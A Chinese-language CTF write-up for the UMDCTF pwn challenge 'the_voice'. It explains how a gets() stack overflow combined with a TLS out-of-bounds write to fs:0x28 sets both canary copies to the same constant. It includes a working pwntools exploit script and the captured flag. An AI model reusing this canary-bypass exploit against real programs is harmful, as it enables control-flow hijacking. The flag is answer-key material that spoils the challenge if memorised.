# the_voice

## 题目简述

程序用 `gets` 向 16 字节栈缓冲区读取命令，之后把命令转换成下标，向线程局部数组 `g[10]` 写入常数 `10191`。需要同时利用栈溢出和 TLS 数组越界，把当前栈帧中的 Canary 与线程控制块里的基准 Canary 改成相同值，再返回到 `give_flag()`。

## 解题过程

代码表面上只有一次固定值写入：

```c
__thread long long g[10];

gets(command);
g[atoi(command)] = 10191;
```

但 `g` 位于线程局部存储区。当前二进制中，`g` 的起点相对 FS 基址位于负偏移，而 x86-64 glibc 的栈保护值位于 `fs:0x28`。由实际布局可得 `g[15]` 正好落到 `fs:0x28`，所以命令必须以字符串 `15` 开头。

`atoi` 需要在溢出数据到来前停止解析，因此在 `15` 后插入空字节。`gets` 本身不会因空字节停止，它仍会继续接收直到换行，于是同一输入既能让 `atoi(command) == 15`，又能覆盖后面的栈数据。

从 `command` 开头到当前栈帧 Canary 的偏移为 24 字节。先把栈上的 Canary 覆盖为 `10191`，随后程序执行 `g[15] = 10191`，把 `fs:0x28` 中用于比较的基准值也改成相同常数。函数尾部的 Canary 校验因此通过。

payload 布局为：

```python
context.binary = elf = ELF("./the_voice")
io = process(elf.path)

payload = b"15\x00"
payload += b"A" * 21
payload += p64(10191)              # 栈帧中的 Canary
payload += b"B" * 8                # 保存的 RBP
payload += p64(elf.sym["give_flag"])

io.sendline(payload)
print(io.recvall().decode())
```

`give_flag()` 直接打开并打印 `flag.txt`，得到：

```text
UMDCTF{pwn_g3ss3r1t_sk1ll5_d0nt_tak3_a5_many_y3ar5_t0_l3arn_pau1}
```

## 方法总结

本题展示了 Canary 的一个反常规绕过：不泄露随机 Canary，而是同时改写“栈上的副本”和 TLS 中的原值。空字节让 `atoi` 只解析前缀，却不会截断 `gets` 的后续溢出；TLS 越界下标 15 则把固定值写到 `fs:0x28`。两部分缺一不可。
